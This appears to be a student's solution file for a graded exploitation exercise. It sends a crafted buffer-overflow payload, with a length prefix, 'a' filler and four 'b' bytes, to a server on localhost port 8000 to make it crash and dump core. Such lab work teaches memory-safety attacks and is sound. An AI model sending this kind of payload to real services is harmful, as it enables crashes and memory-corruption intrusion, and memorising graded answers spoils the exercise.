import os
import socket


HOST = '127.0.0.1'
PORT = 8000


def get_payload() -> bytes:
    """
    This function returns the data to send over the socket to the server.

    This data should cause the server to crash and generate a core dump. Make
    sure to return a `bytes` object and not an `str` object.

    WARNINGS:
    0. Don't delete this function or change it's name/parameters - we are going
       to test it directly in our tests, without running the main() function
       below.

    Returns:
         The bytes of the payload.
    """
    
    p = bytearray(1048)
    p[0:4] = (1044).to_bytes(4, byteorder='big')
    p[4:-5] = b'a' * 1039
    p[-5:-1] = b'b' * 4
    p[-1:] = b'\0'

    return(bytes(p))


def main():
    # WARNING: DON'T EDIT THIS FUNCTION!
    payload = get_payload()
    conn = socket.socket()
    conn.connect((HOST, PORT))
    try:
        conn.sendall(payload)
    finally:
        conn.close()


if __name__ == '__main__':
    main()
